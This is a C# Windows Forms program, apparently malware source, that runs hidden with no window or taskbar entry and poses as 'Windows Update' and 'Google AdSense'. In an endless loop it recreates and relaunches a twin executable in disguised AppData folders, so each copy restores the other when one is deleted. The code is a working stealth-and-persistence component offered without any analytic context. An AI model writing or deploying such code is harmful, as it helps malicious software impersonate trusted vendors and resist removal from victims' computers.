using System;
using System.IO;
using System.Diagnostics;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Windows_Update
{
    public partial class WindowsUpdate : Form
    {
        public WindowsUpdate()
        {
            InitializeComponent();
            Visible = false; // Hide window.
            ShowInTaskbar = false; // Remove from taskbar.

            // Environmental variables
            string appDataRoaming = Environment.GetEnvironmentVariable("appdata");
            string currentDirectory = Environment.CurrentDirectory;

            // Variable locations
            string adSenseLoc = appDataRoaming + "\\Google\\AdSense\\";
            string winUpdLoc = appDataRoaming + "\\Microsoft\\Windows Update\\";

            string winUpdBuddyLoc = winUpdLoc + "bin\\";
            string newBuddy = adSenseLoc + "bin\\";
            
            // MONITORING
            do
            {
                // Recreate AdSense Exe if missing
                if (!System.IO.File.Exists(adSenseLoc + "Google AdSense.exe"))
                {
                    if (!Directory.Exists(adSenseLoc))
                    {
                        Directory.CreateDirectory(adSenseLoc);
                    }
                    if (!Directory.Exists(adSenseLoc + "bin\\"))
                    {
                        Directory.CreateDirectory(adSenseLoc + "bin\\");
                    }
                    if (!System.IO.File.Exists(adSenseLoc + "Google AdSense.exe"))
                    {
                        System.IO.File.Copy(winUpdBuddyLoc + "service.exe", adSenseLoc + "Google AdSense.exe", true);
                    }
                    if (!System.IO.File.Exists(adSenseLoc + "bin\\service.exe"))
                    {
                        System.IO.File.Copy(winUpdLoc + "Windows Update.exe", adSenseLoc + "bin\\service.exe", true);
                    }

                }

                // Run Windows update if not running
                Process[] pname = Process.GetProcessesByName("Google AdSense");
                if (pname.Length == 0)
                    Process.Start(adSenseLoc + "Google AdSense.exe");

                // Optimize CPU utilization
                System.Threading.Thread.Sleep(15000);

            } while (true);


        }
    }
}
